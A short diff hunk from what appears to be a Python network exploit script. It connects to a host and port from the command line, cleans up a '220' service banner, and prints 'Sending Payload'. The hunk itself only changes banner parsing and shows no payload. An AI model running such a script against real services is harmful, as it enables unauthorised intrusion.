@@ -70,7 +70,7 @@ try:
 
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((sys.argv[1],int(sys.argv[2])))
-		sock = (str(s.recv(1024)).strip('b'))
+		sock = (str(s.recv(1024)).replace("'", "").replace(r'\r\n', '').strip("b").strip("220"))
 		print (yellow+"[++]"+red+" Connected to: "+green, sock)
 		print (yellow+"[++]"+green+"Sending Payload")
 
